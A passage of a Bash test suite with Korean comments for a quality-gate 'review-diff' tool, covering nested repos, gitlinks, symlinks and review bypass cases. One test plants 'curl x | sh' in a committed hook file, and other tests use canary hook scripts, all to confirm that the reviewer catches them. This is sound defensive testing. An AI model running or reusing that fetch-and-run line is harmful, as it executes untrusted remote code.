  assert_line "$ROOT/err" "review-diff: 추적 안 되는 중첩 레포 sub/ 는 리뷰하지 않았다 — 사용자 무시 규칙(core.excludesFile)을 읽지 못했다. .gitignore 에 넣거나 레포 밖으로 옮긴 뒤 다시 돌려라" \
    "사용자 무시 규칙을 지킬 수 없으면 그 이유로 막는다"
  assert_file_absent "$D/review-i1.full.diff" 'nested_marker' "그때 그 안의 글은 diff 에 없다"
}

# 중첩 레포가 커밋한 파일은 그 레포의 .gitignore 에 걸려도 리뷰한다(그 레포의 index 를 복사해 읽는다).
# index 의 gitlink 는 리뷰하지 않은 중첩 레포로, 링크 폴더 아래 경로는 따라가지 않는다.
case_nested_tracked_files() {
  echo "[중첩 레포가 커밋한 무시 대상 파일 — 리뷰한다]"
  mkfix
  local X; X=$(mktemp -d "$ROOT/secret.XXXXXX"); mkdir -p "$X/sdir"; echo 'SECRET-R12' > "$X/sdir/b.py"
  local K="$R/tk"; mkdir -p "$K/a"; git init -q -b trunk "$K"
  printf 'payload.py\na\n' > "$K/.gitignore"
  echo 'nested_payload_marker = 1' > "$K/payload.py"; echo 'gone = 1' > "$K/gone.py"
  echo 'under_link_marker = 1' > "$K/a/b.py"
  g "$K" add .gitignore gone.py; g "$K" add -f payload.py a/b.py; g "$K" commit -q -m k
  rm -f -- "$K/gone.py"
  rm -rf -- "$K/a"; ln -s "$X/sdir" "$K/a"
  git init -q -b trunk "$K/gl"; echo 'gl_marker = 1' > "$K/gl/z.py"; g "$K/gl" add z.py; g "$K/gl" commit -q -m z
  g "$K" -c advice.addEmbeddedRepo=false add -f gl; g "$K" commit -q -m gl
  local S2="$R/st"; mkdir -p "$S2/d"; git init -q -b trunk "$S2"
  printf '*\n' > "$S2/.gitignore"; echo 'st_x_marker = 1' > "$S2/x.py"; echo 'st_y_marker = 1' > "$S2/d/y.py"
  g "$S2" add -f .gitignore x.py d/y.py; g "$S2" commit -q -m s
  local Z="$R/z0"; git init -q -b trunk "$Z"; printf '*\n' > "$Z/.gitignore"; echo 'z = 1' > "$Z/z.py"
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  assert_file_grep "$D/review-i1.diff" '^\+nested_payload_marker = 1$' "무시 대상이어도 커밋한 파일을 리뷰한다"
  assert_file_grep "$D/review-i1.diff" '^\+st_x_marker = 1$' ".gitignore 가 * 여도 커밋한 x.py 를 리뷰한다"
  assert_file_grep "$D/review-i1.diff" '^\+st_y_marker = 1$' ".gitignore 가 * 여도 커밋한 d/y.py 를 리뷰한다"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/st/\.gitignore$' ".gitignore 가 * 여도 커밋한 .gitignore 를 리뷰한다"
  assert_file_absent "$D/review-i1.names" 'gone\.py' "작업 트리에서 지운 커밋 파일은 싣지 않는다"
  assert_file_absent "$D/review-i1.full.diff" 'SECRET-R12|under_link_marker' "링크 폴더 아래 커밋 경로는 따라가지 않는다"
  assert_line "$ROOT/err" "review-diff: 추적 안 되는 중첩 레포 tk/gl/ ${NESTED_TAIL}" "index 의 gitlink 는 리뷰하지 않았다고 알린다"
  assert_file_absent "$D/review-i1.full.diff" 'gl_marker' "gitlink 안의 글은 없다"
  assert_line "$ROOT/err" "$(nested_said st/ 3)" "st/ 에서 실은 파일 수"
  assert_line "$ROOT/err" "$(nested_said z0/ 0)" "실을 파일이 없는 중첩 레포도 0개로 알린다"
  assert_file_absent "$ROOT/err" '들지 못해' "이름 대조에서 빠진 경로가 없다"
  assert_eq "$(field degraded "$OUT")" yes "gitlink 가 있으면 degraded: yes"
}

# 중첩 레포의 .git 이 안전하게 읽을 수 없는 꼴이면 펼치지 않고 막는다 — 다른 곳을 가리키는 .git 파일,
# 링크이거나 너무 큰 .git/info/exclude, 깨지거나 너무 크거나 나뉜 .git/index.
case_nested_unsafe_git_files() {
  echo "[중첩 레포의 .git 이 안전하지 않은 꼴 — 이유와 함께 막는다]"
  mkfix
  local X; X=$(mktemp -d "$ROOT/secret.XXXXXX"); echo 'SECRET-R12' > "$X/exclude"
  git init -q -b trunk --separate-git-dir "$ROOT/gf-gitdir" "$R/gf"; echo 'gf_marker = 1' > "$R/gf/a.py"
  git init -q -b trunk "$R/sx"; echo 'sx_marker = 1' > "$R/sx/a.py"
  mkdir -p "$R/sx/.git/info"; rm -f -- "$R/sx/.git/info/exclude"; ln -s "$X/exclude" "$R/sx/.git/info/exclude"
  git init -q -b trunk "$R/bx"; echo 'bx_marker = 1' > "$R/bx/a.py"; mkdir -p "$R/bx/.git/info"
  python3 -I -c 'import sys; open(sys.argv[1], "w").write("# x\n" * 20000)' "$R/bx/.git/info/exclude"
  git init -q -b trunk "$R/mi"; echo 'mi_marker = 1' > "$R/mi/a.py"; printf 'garbage' > "$R/mi/.git/index"
  git init -q -b trunk "$R/ox"; echo 'ox_marker = 1' > "$R/ox/a.py"
  python3 -I -c 'import sys; open(sys.argv[1], "wb").truncate(33554433)' "$R/ox/.git/index"
  git init -q -b trunk "$R/sp"; echo 'sp_marker = 1' > "$R/sp/a.py"; g "$R/sp" add a.py; g "$R/sp" commit -q -m s
  g "$R/sp" update-index --split-index
  echo 'new = 1' > "$R/new.py"
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  local fix='.gitignore 에 넣거나 레포 밖으로 옮긴 뒤 다시 돌려라'
  assert_line "$ROOT/err" "review-diff: 추적 안 되는 중첩 레포 gf/ 는 리뷰하지 않았다 — .git 이 폴더가 아니라(다른 곳을 가리키는 파일 · 링크) 그 안을 안전하게 읽지 못했다. $fix" \
    ".git 파일인 중첩 레포는 막는다"
  assert_line "$ROOT/err" "review-diff: 추적 안 되는 중첩 레포 sx/ 는 리뷰하지 않았다 — 그 레포의 무시 목록(.git/info/exclude)을 안전하게 읽지 못했다. $fix" \
    "링크인 info/exclude 는 막는다"
  assert_line "$ROOT/err" "review-diff: 추적 안 되는 중첩 레포 bx/ 는 리뷰하지 않았다 — 그 레포의 무시 목록(.git/info/exclude)을 안전하게 읽지 못했다. $fix" \
    "너무 큰 info/exclude 는 막는다"
  local p
  for p in mi ox sp; do
    assert_line "$ROOT/err" "review-diff: 추적 안 되는 중첩 레포 $p/ 는 리뷰하지 않았다 — 그 레포의 추적 파일 목록(.git/index)을 안전하게 읽지 못했다. $fix" \
      "읽을 수 없는 index 는 막는다: $p"
  done
  assert_file_absent "$D/review-i1.full.diff" 'gf_marker|sx_marker|bx_marker|mi_marker|ox_marker|sp_marker|SECRET-R12' \
    "막은 중첩 레포의 글은 diff 에 없다"
  for p in gf sx bx mi ox sp; do
    assert_file_grep "$D/review-i1.names" "^$p/\$" "names 에 폴더 줄 $p/"
  done
  assert_eq "$(field degraded "$OUT")" yes "degraded: yes"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/new\.py$' "다른 파일은 그대로 리뷰한다"
}

# 이 레포에 등록된 (qg 가 아닌) worktree 는 중첩 레포로 펼치지 않는다 — 리뷰하지 않고 이유와 함께 막는다.
case_nested_registered_worktree() {
  echo "[이 레포에 등록된 worktree — 펼치지 않고 막는다]"
  mkfix
  git -C "$R" worktree add -q --detach "$R/wtx" 2>/dev/null
  echo 'wt_marker = 1' > "$R/wtx/wt.py"
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  assert_line "$ROOT/err" "review-diff: 추적 안 되는 중첩 레포 wtx/ 는 리뷰하지 않았다 — 이 레포에 등록된 git worktree 라 그 안을 읽지 않는다. .gitignore 에 넣거나 레포 밖으로 옮긴 뒤 다시 돌려라" \
    "등록된 worktree 를 이유와 함께 알린다"
  assert_file_absent "$D/review-i1.full.diff" 'wt_marker' "그 안의 글은 diff 에 없다"
  assert_eq "$(field degraded "$OUT")" yes "degraded: yes"
}

# 중첩 레포 하나에서 실을 파일이 상한(NESTED_MAX_FILES)을 넘으면 펼치지 않고 막는다. 상한과 같으면 싣는다.
case_nested_file_cap() {
  echo "[중첩 레포 파일 수 상한 — 넘으면 막는다]"
  mkfix
  local cap; cap=$(sed -n 's/^NESTED_MAX_FILES=\([0-9][0-9]*\).*$/\1/p' "$RDIFF")
  case "$cap" in ''|*[!0-9]*) no "NESTED_MAX_FILES 를 읽지 못했다"; return ;; esac
  git init -q -b trunk "$R/big"
  ( cd "$R/big" && i=0; while [ "$i" -le "$cap" ]; do echo "big_marker_$i = 1" > "f$i.py"; i=$((i + 1)); done )
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  assert_line "$ROOT/err" "review-diff: 추적 안 되는 중첩 레포 big/ 는 리뷰하지 않았다 — 파일이 ${cap}개를 넘어 리뷰에 싣지 않았다 — 필요 없는 폴더를 그 레포의 .gitignore 에 넣거나 이 레포를 바깥 .gitignore 에 넣어라" \
    "상한을 넘으면 이유와 함께 막는다"
  assert_file_absent "$D/review-i1.full.diff" 'big_marker' "그 안의 글은 diff 에 없다"
  assert_file_grep "$D/review-i1.names" '^big/$' "names 에 폴더 줄 big/"
  assert_eq "$(field degraded "$OUT")" yes "degraded: yes"
  rm -f -- "$R/big/f0.py"
  rd --mode session
  assert_line "$ROOT/err" "$(nested_said big/ "$cap")" "상한과 같으면 싣는다(양의 짝)"
  assert_eq "$(field degraded "$OUT")" no "상한과 같으면 degraded: no"
}

# 하위 모듈(gitlink) 폴더 안에서 git 을 돌리지 않는다 — 심은 core.fsmonitor 가 돌지 않는다.
case_gitlink_no_git_inside() {
  echo "[gitlink 폴더 — 그 안에서 git 을 돌리지 않는다]"
  mkfix
  local Sm="$R/sub"; mkdir -p "$Sm"
  git init -q -b trunk "$Sm"; echo 'x = 1' > "$Sm/x.py"; g "$Sm" add x.py; g "$Sm" commit -q -m s
  g "$R" -c advice.addEmbeddedRepo=false add sub; g "$R" commit -q -m gitlink
  echo 'x = 2' > "$Sm/x.py"; echo 'y = 1' > "$Sm/new.py"   # 하위 모듈을 더럽힌다
  local fsm; fsm=$(mktemp -d "$ROOT/fsm.XXXXXX")
  printf '#!/bin/sh\ntouch "%s/RAN"\nexit 1\n' "$fsm" > "$fsm/hook.sh"; chmod +x "$fsm/hook.sh"
  git -C "$Sm" config core.fsmonitor "$fsm/hook.sh"
  echo 'x = 3' > "$R/src/a.py"
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  [ ! -e "$fsm/RAN" ] && ok "gitlink 폴더의 core.fsmonitor 가 돌지 않았다" || no "gitlink 폴더의 core.fsmonitor 가 돌았다"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/src/a\.py$' "다른 변경은 그대로 리뷰한다"
}

# 하위 모듈 diff 꼴을 고정한다 — 사용자 설정 diff.submodule=diff 여도 gitlink 폴더 안에서 자식 git diff 를
# 띄우지 않는다(그 폴더의 diff.external 이 돌지 않는다).
case_submodule_diff_format_pinned() {
  echo "[diff.submodule=diff — gitlink 폴더의 diff.external 이 돌지 않는다]"
  mkfix
  local canary; canary=$(mktemp -d "$ROOT/canary.XXXXXX")
  printf '#!/bin/sh\ntouch "%s/RAN"\nexit 0\n' "$canary" > "$canary/ext.sh"; chmod +x "$canary/ext.sh"
  local Sm="$R/sub"; mkdir -p "$Sm"
  git init -q -b trunk "$Sm"; echo 'x = 1' > "$Sm/x.py"; g "$Sm" add x.py; g "$Sm" commit -q -m s1
  g "$R" -c advice.addEmbeddedRepo=false add sub; g "$R" commit -q -m gl1
  local B; B=$(git -C "$R" rev-parse HEAD)
  echo 'x = 2' > "$Sm/x.py"; g "$Sm" commit -q -am s2
  g "$R" add sub; g "$R" commit -q -m gl2
  git -C "$Sm" config diff.external "$canary/ext.sh"
  git -C "$R" config diff.submodule diff
  echo 'x = 3' > "$R/src/a.py"
  rd --mode session
  assert_eq "$RC" 0 "session rc 0"
  [ ! -e "$canary/RAN" ] && ok "session: gitlink 폴더의 diff.external 이 돌지 않았다" || no "session: gitlink 폴더의 diff.external 이 돌았다"
  assert_file_grep "$D/review-i1.full.diff" '^\+Subproject commit ' "session: gitlink 는 짧은 꼴(Subproject commit)로 보인다"
  rm -f "$canary/RAN"
  local S="$D/topic-scope.txt"
  printf 'status: ok\nboundary: %s\ntree: %s\n' "$B" "$(git -C "$R" rev-parse "HEAD^{tree}")" > "$S"
  rd --mode topic --scope-file "$S"
  assert_eq "$RC" 0 "topic rc 0"
  [ ! -e "$canary/RAN" ] && ok "topic: gitlink 폴더의 diff.external 이 돌지 않았다" || no "topic: gitlink 폴더의 diff.external 이 돌았다"
  git -C "$R" config --unset diff.submodule
}

# 세션 — 스테이지한 중첩 레포(git add vendor/lib)는 --others 를 떠나 gitlink 가 된다. 선언되지 않았으면 알리고 degraded.
case_session_staged_gitlink_degraded() {
  echo "[session — 스테이지한 중첩 레포(gitlink)는 degraded]"
  mkfix
  local N="$R/vendor/lib"; mkdir -p "$N"
  git init -q -b trunk "$N"; echo 'staged_marker = 1' > "$N/a.py"; g "$N" add a.py; g "$N" commit -q -m n
  g "$R" -c advice.addEmbeddedRepo=false add vendor/lib
  echo 'x = 2' > "$R/src/a.py"
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field degraded "$OUT")" yes "degraded: yes"
  assert_file_grep "$ROOT/err" "중첩 레포 vendor/lib ${NESTED_TAIL}\$" "스테이지한 gitlink 를 알린다"
  assert_file_absent "$D/review-i1.full.diff" 'staged_marker' "그 안의 글은 diff 에 없다"
}

# 브랜치 — 커밋한 선언되지 않은 gitlink 도 같다.
# 하위 모듈 ignore 설정(변경이 더한 .gitmodules 의 ignore = all · 사용자 diff.ignoreSubmodules=all)이 gitlink 를
# diff 에서 숨기지 못한다.
case_ignore_all_cannot_hide_gitlink() {
  echo "[ignore = all · diff.ignoreSubmodules=all — gitlink 를 숨기지 못한다]"
  mkfix
  local N="$R/vendor/lib"; mkdir -p "$N"
  git init -q -b trunk "$N"; echo 'a = 1' > "$N/a.py"; g "$N" add a.py; g "$N" commit -q -m n
  printf '[submodule "x"]\n\tpath = vendor/lib\n\turl = https://example.invalid/x\n\tignore = all\n' > "$R/.gitmodules"
  g "$R" -c advice.addEmbeddedRepo=false add vendor/lib .gitmodules; g "$R" commit -q -m gl
  rd --mode branch
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field degraded "$OUT")" yes "변경이 더한 ignore = all 이어도 degraded: yes"
  assert_file_grep "$ROOT/err" "중첩 레포 vendor/lib ${NESTED_TAIL}\$" "ignore = all 이어도 알린다"
  assert_file_grep "$D/review-i1.names" '^vendor/lib$' "names 에 gitlink 가 있다"
  # 사용자 설정 diff.ignoreSubmodules=all — .gitmodules 없이
  mkfix
  N="$R/vendor/lib"; mkdir -p "$N"
  git init -q -b trunk "$N"; echo 'a = 1' > "$N/a.py"; g "$N" add a.py; g "$N" commit -q -m n
  g "$R" -c advice.addEmbeddedRepo=false add vendor/lib; g "$R" commit -q -m gl
  git -C "$R" config diff.ignoreSubmodules all
  rd --mode branch
  assert_eq "$(field degraded "$OUT")" yes "diff.ignoreSubmodules=all 이어도 degraded: yes"
  assert_file_grep "$ROOT/err" "중첩 레포 vendor/lib ${NESTED_TAIL}\$" "diff.ignoreSubmodules=all 이어도 알린다"
  printf 'status: ok\nstart: %s\nend: %s\n' "$C0" "$(git -C "$R" rev-parse HEAD)" > "$D/range-scope.txt"
  rd --mode range --scope-file "$D/range-scope.txt"
  assert_eq "$(field degraded "$OUT")" yes "range 도 diff.ignoreSubmodules=all 이어도 degraded: yes"
}

case_branch_committed_gitlink_degraded() {
  echo "[branch — 커밋한 선언되지 않은 gitlink 는 degraded]"
  mkfix
  local N="$R/vendor/lib"; mkdir -p "$N"
  git init -q -b trunk "$N"; echo 'a = 1' > "$N/a.py"; g "$N" add a.py; g "$N" commit -q -m n
  g "$R" -c advice.addEmbeddedRepo=false add vendor/lib; g "$R" commit -q -m gl
  rd --mode branch
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field degraded "$OUT")" yes "degraded: yes"
  assert_file_grep "$ROOT/err" "중첩 레포 vendor/lib ${NESTED_TAIL}\$" "커밋한 gitlink 를 알린다"
}

# 토픽 모드 — boundary 에 선언되지 않은 새 gitlink 는 리뷰하지 않았다고 알린다(판정은 그대로).
case_topic_new_gitlink_disclosed() {
  echo "[topic — 선언되지 않은 새 gitlink 를 알린다]"
  mkfix
  printf '[submodule "decl"]\n\tpath = decl\n\turl = https://example.invalid/decl\n' > "$R/.gitmodules"
  g "$R" add .gitmodules; g "$R" commit -q -m gm
  local B; B=$(git -C "$R" rev-parse HEAD)
  local n
  for n in vend decl; do
    mkdir -p "$R/$n"; git init -q -b trunk "$R/$n"; echo 'z = 1' > "$R/$n/z.py"
    g "$R/$n" add z.py; g "$R/$n" commit -q -m z
    g "$R" -c advice.addEmbeddedRepo=false add "$n"
  done
  echo 'y = 2' > "$R/lib/b.py"; g "$R" add lib/b.py
  g "$R" commit -q -m t1
  local tree; tree=$(git -C "$R" rev-parse "HEAD^{tree}")
  local S="$D/topic-scope.txt"
  printf 'status: ok\nboundary: %s\ntree: %s\n' "$B" "$tree" > "$S"
  rd --mode topic --scope-file "$S"
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field degraded "$OUT")" yes "degraded: yes (선언되지 않은 새 gitlink)"
  assert_file_grep "$ROOT/err" "중첩 레포 vend ${NESTED_TAIL}\$" "선언되지 않은 새 gitlink vend 를 알린다"
  assert_file_absent "$ROOT/err" '중첩 레포 decl ' "boundary 의 .gitmodules 에 선언된 decl 은 알리지 않는다"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/lib/b\.py$' "다른 변경은 그대로 리뷰한다"
  # 선언된 하위 모듈의 커밋만 바뀐 범위는 알리지 않고 degraded 도 아니다(양의 짝).
  echo 'z = 2' > "$R/decl/z.py"; g "$R/decl" commit -q -am z2; g "$R" add decl; g "$R" commit -q -m bump-decl
  printf 'status: ok\nboundary: %s\ntree: %s\n' "$(git -C "$R" rev-parse HEAD~1)" "$(git -C "$R" rev-parse "HEAD^{tree}")" > "$S"
  rd --mode topic --scope-file "$S"
  assert_eq "$RC" 0 "rc 0 (선언된 하위 모듈 커밋만 바뀜)"
  assert_eq "$(field degraded "$OUT")" no "선언된 하위 모듈 커밋 변경은 degraded 아님"
  assert_file_absent "$ROOT/err" '중첩 레포' "선언된 하위 모듈 커밋 변경은 알리지 않는다"
  # 선언되지 않은 gitlink 의 커밋이 바뀐 범위는 알리고 degraded 다(그 안의 변경도 리뷰하지 못한다).
  echo 'z = 3' > "$R/vend/z.py"; g "$R/vend" commit -q -am z3; g "$R" add vend; g "$R" commit -q -m bump-vend
  printf 'status: ok\nboundary: %s\ntree: %s\n' "$(git -C "$R" rev-parse HEAD~1)" "$(git -C "$R" rev-parse "HEAD^{tree}")" > "$S"
  rd --mode topic --scope-file "$S"
  assert_eq "$(field degraded "$OUT")" yes "선언되지 않은 gitlink 의 커밋 변경은 degraded: yes"
  assert_file_grep "$ROOT/err" "중첩 레포 vend ${NESTED_TAIL}\$" "선언되지 않은 gitlink 의 커밋 변경을 알린다"
}

# 범위 모드 — 선언되지 않은 새 gitlink 가 있으면 degraded · 크게 알린다.
case_range_new_gitlink_degraded() {
  echo "[range — 선언되지 않은 새 gitlink 는 degraded]"
  mkfix
  mkdir -p "$R/vend"; git init -q -b trunk "$R/vend"; echo 'z = 1' > "$R/vend/z.py"
  g "$R/vend" add z.py; g "$R/vend" commit -q -m z
  g "$R" -c advice.addEmbeddedRepo=false add vend
  echo 'y = 2' > "$R/lib/b.py"; g "$R" add lib/b.py; g "$R" commit -q -m t1
  local F="$D/range-scope.txt"
  printf 'status: ok\nstart: %s\nend: %s\n' "$C0" "$(git -C "$R" rev-parse HEAD)" > "$F"
  rd --mode range --scope-file "$F"
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field degraded "$OUT")" yes "degraded: yes"
  assert_eq "$(printf '%s\n' "$OUT" | wc -l | tr -d ' ')" 10 "stdout 10줄"
  assert_file_grep "$ROOT/err" "중첩 레포 vend ${NESTED_TAIL}\$" "새 gitlink vend 를 알린다"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/lib/b\.py$' "다른 변경은 그대로 리뷰한다"
  # 양의 짝 — gitlink 없는 범위는 degraded 아님
  printf 'status: ok\nstart: %s\nend: %s\n' "$(git -C "$R" rev-parse HEAD)" "$(git -C "$R" rev-parse HEAD)" > "$F"
  g "$R" commit -q --allow-empty -m e
  printf 'status: ok\nstart: %s\nend: %s\n' "$(git -C "$R" rev-parse HEAD~1)" "$(git -C "$R" rev-parse HEAD)" > "$F"
  rd --mode range --scope-file "$F"
  assert_eq "$(field degraded "$OUT")" no "gitlink 없는 범위는 degraded: no"
}

# 실행 확인 — Step 1c 의 「수인 files: 와 degraded: yes」 규칙이 고른 판정 입력을 SKILL 에서 꺼내 그대로
# 판정 펜스까지 흘려 보면 판정 줄이 clean 이 아니다(이 입력은 Step 1c 출력에서 나오고 레포 안 파일을 다시
# 읽지 않는다).
case_degraded_blocks_certification() {
  echo "[degraded: yes(수인 files:) — 판정 줄이 clean 이 아니다]"
  mkfix
  mkdir -p "$R/vendor/lib"; git init -q -b trunk "$R/vendor/lib"; echo 'a = 1' > "$R/vendor/lib/a.py"
  git init -q -b trunk "$R/vendor/lib/inner"; echo 'b = 1' > "$R/vendor/lib/inner/b.py"
  echo 'new = 1' > "$R/new.py"
  rd --mode session
  assert_eq "$(field degraded "$OUT")" yes "degraded: yes"
  case "$(field files "$OUT")" in ''|-|*[!0-9]*) no "files: 가 수가 아니다" ;; *) ok "files: 가 수다" ;; esac
  local SK="$PLUGIN_DIR/skills/quality-pipeline/SKILL.md" row args
  row=$(grep -F '| Step 1c 가 `degraded: yes` 와 수인 `files:` 를 냈다' "$SK")
  assert_eq "$(printf '%s\n' "$row" | grep -c .)" 1 "판정 입력 표에 그 행이 하나"
  args=$(printf '%s\n' "$row" | awk -F'|' '{print $3}' | sed -n 's/^ *`\(.*\)` *$/\1/p')
  assert_eq "$args" "--reason error-axis" "그 행의 판정 입력은 --reason error-axis"
  local V="$PLUGIN_DIR/scripts/verdict.py"
  # 그 입력은 Step 3.9 의 리뷰 결과 줄(qg-verdict-args: --blocking 0 --optional 0 --reason error-axis)로 판정 펜스에 닿는다.
  # shellcheck disable=SC2086
  local line; line=$(python3 "$V" --line --blocking 0 --optional 0 $args --new-failures 0 \
    --excluded 0 --iter 1 --sha abc1234 --e2e '안 함' | tail -n 1)
  assert_not_contains "$line" "qg: clean" "판정 줄이 clean 이 아니다"
  assert_contains "$line" "not-certified (error-axis)" "판정 줄이 not-certified (error-axis)"
}

# 폴더를 가리키는 추적 안 된 링크는 중첩 레포가 아니다 — 링크 자체(가리키는 곳)로 diff 에 실린다.
case_untracked_symlink_to_dir() {
  echo "[폴더를 가리키는 추적 안 된 링크 — 링크 자체로 리뷰]"
  mkfix
  ln -s src "$R/srclink"
  ln -s "$R/lib" "$R/abslink"
  ln -s src "$R/d link"
  ln -s 'src/a.py' "$R/flink"
  echo 'plain = 1' > "$R/plain.py"
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field degraded "$OUT")" no "degraded: no"
  assert_eq "$(field files "$OUT")" 5 "files: 5"
  assert_file_grep "$D/review-i1.names" '^srclink$' "names 에 srclink"
  assert_file_grep "$D/review-i1.diff" '^diff --git a/srclink b/srclink$' "diff 머리가 실제 이름이다"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/srclink$' "걸러진 diff 에 srclink"
  assert_file_grep "$D/review-i1.diff" '^\+src$' "링크 대상이 diff 본문이다"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/abslink$' "걸러진 diff 에 절대 경로 링크"
  assert_file_grep "$D/review-i1.diff" '^diff --git a/d link b/d link$' "공백 든 링크 이름의 머리"
  assert_file_grep "$D/review-i1.diff" "^\+\+\+ b/d link${TAB}\$" "공백 든 이름의 +++ 줄 끝 TAB(git 과 같다)"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/flink$' "파일을 가리키는 링크도 diff 에(양의 짝)"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/plain\.py$' "보통 untracked 파일도 diff 에(양의 짝)"
  assert_eq "$(grep -c '^new file mode 120000$' "$D/review-i1.diff")" 4 "링크 넷 모두 mode 120000"
  assert_file_absent "$D/review-i1.diff" 'link\.tmp|srclink/|^\+\+\+ b/src/' "임시 이름 · 폴더 펼치기가 diff 에 없다"
  assert_file_absent "$ROOT/err" '중첩 레포' "링크는 중첩 레포로 알리지 않는다"
}

# 리포가 정한 이름으로 폴더를 만들지 않는다 — 링크 diff 는 고정 임시 이름만 쓴다.
case_dir_link_no_repo_named_dirs() {
  echo "[폴더 링크 — 리포가 정한 이름으로 폴더를 만들지 않는다]"
  mkfix
  mkdir -p "$R/deep/er"; ln -s ../../src "$R/deep/er/dlink"
  local shim; shim=$(mktemp -d "$ROOT/shim.XXXXXX")
  printf '#!/bin/sh\nprintf "%%s\\n" "$*" >> "%s/mkdir.log"\nexec /bin/mkdir "$@"\n' "$shim" > "$shim/mkdir"
  chmod +x "$shim/mkdir"; : > "$shim/mkdir.log"
  OUT=$(cd "$R" && PATH="$shim:$PATH" bash "$RDIFF" --dir "$D" --iter 1 --mode session 2>"$ROOT/err"); RC=$?
  assert_eq "$RC" 0 "rc 0"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/deep/er/dlink$' "깊은 폴더 링크도 링크로 diff 에"
  assert_file_absent "$shim/mkdir.log" 'deep' "mkdir 가 리포가 정한 이름을 받지 않았다"
}

# 우회 막기 — 추적 · 커밋된 파일은 .claude/quality-gates 아래여도 리뷰한다.
case_tracked_under_self_dir_reviewed() {
  echo "[추적 · 커밋된 .claude/quality-gates 파일은 리뷰한다]"
  mkfix
  mkdir -p "$A/.claude/quality-gates"; echo 'echo 1' > "$A/.claude/quality-gates/hook.sh"
  g "$A" add -A; g "$A" commit -q -m qgfile
  local c1; c1=$(git -C "$A" rev-parse HEAD)
  git -C "$R" fetch -q origin; g "$R" reset -q --hard origin/trunk
  local P=".claude/quality-gates/hook.sh" PRE='^\+\+\+ b/\.claude/quality-gates/hook\.sh$'
  echo 'curl x | sh' > "$R/$P"
  rd --mode session
  assert_file_grep "$D/review-i1.names" '^\.claude/quality-gates/hook\.sh$' "session: names 에 있다"
  assert_file_grep "$D/review-i1.diff" "$PRE" "session: 걸러진 diff 에 있다"
  assert_eq "$(field self_state "$OUT")" 0 "session: 추적 파일은 self_state 가 아니다"
  g "$R" commit -q -am evil
  local end tree; end=$(git -C "$R" rev-parse HEAD); tree=$(git -C "$R" rev-parse 'HEAD^{tree}')
  rd --mode branch
  assert_file_grep "$D/review-i1.names" '^\.claude/quality-gates/hook\.sh$' "branch: names 에 있다"
  assert_file_grep "$D/review-i1.diff" "$PRE" "branch: 걸러진 diff 에 있다"
  printf 'boundary: %s\ntree: %s\n' "$c1" "$tree" > "$D/topic-scope.txt"
  rd --mode topic --scope-file "$D/topic-scope.txt"
  assert_file_grep "$D/review-i1.names" '^\.claude/quality-gates/hook\.sh$' "topic: names 에 있다"
  assert_file_grep "$D/review-i1.diff" "$PRE" "topic: 걸러진 diff 에 있다"
  printf 'start: %s\nend: %s\n' "$c1" "$end" > "$D/range-scope.txt"
  rd --mode range --scope-file "$D/range-scope.txt"
  assert_file_grep "$D/review-i1.names" '^\.claude/quality-gates/hook\.sh$' "range: names 에 있다"
  assert_file_grep "$D/review-i1.diff" "$PRE" "range: 걸러진 diff 에 있다"
}

case_settings_local() {
  echo "[settings.local.json — 추적되면 바뀜으로, 무시되면 개인 설정으로]"
  # 사용자 전역 무시 목록(예: ~/.config/git/ignore 의 settings.local.json)에 기대지 않는다.
  : > "$ROOT/empty-ignore"
  mkfix
  git -C "$R" config core.excludesFile "$ROOT/empty-ignore"
  mkdir -p "$R/.claude"
  printf '{"env": {"DEVBREW_QUALITY_GATES_DOC_PATHS": "docs/**"}}\n' > "$R/.claude/settings.local.json"
  echo "doc2" > "$R/docs/x.md"
  g "$R" add -A; g "$R" commit -q -m local
  OUT=$(cd "$R" && DEVBREW_QUALITY_GATES_DOC_PATHS='docs/**' bash "$RDIFF" --dir "$D" --iter 1 --mode branch 2>"$ROOT/err"); RC=$?
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field doc_paths_source "$OUT")" default-settings-changed "추적된 local 변경 → default-settings-changed"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/docs/x\.md$' "docs/x.md 가 diff 에 남는다"
  # 작업 트리의 무시된 local 파일은 이 변경이 아니다.
  mkfix
  git -C "$R" config core.excludesFile "$ROOT/empty-ignore"
  mkdir -p "$R/.claude"
  printf '{"env": {"DEVBREW_QUALITY_GATES_DOC_PATHS": "docs/**"}}\n' > "$R/.claude/settings.local.json"
  printf '.claude/settings.local.json\n' > "$R/.git/info/exclude"
  echo "doc2" > "$R/docs/x.md"
  OUT=$(cd "$R" && DEVBREW_QUALITY_GATES_DOC_PATHS='docs/**' bash "$RDIFF" --dir "$D" --iter 1 --mode session 2>"$ROOT/err"); RC=$?
  assert_eq "$(field doc_paths_source "$OUT")" env "무시된 local 파일 → doc_paths_source: env"
  assert_eq "$(field excluded "$OUT")" 1 "docs/x.md 가 빠진다"
  # 같은 파일이 무시되지 않은 untracked 면 이 변경의 일부다.
  : > "$R/.git/info/exclude"
  OUT=$(cd "$R" && DEVBREW_QUALITY_GATES_DOC_PATHS='docs/**' bash "$RDIFF" --dir "$D" --iter 1 --mode session 2>"$ROOT/err"); RC=$?
  assert_eq "$(field doc_paths_source "$OUT")" default-settings-changed "무시되지 않은 untracked local → default-settings-changed"
}

case_from_subdir() {
  echo "[하위 디렉토리에서 불러도 리포 최상위 기준]"
  mkfix
  echo 'x = 2' > "$R/src/a.py"; echo "# c" > "$R/README.md"
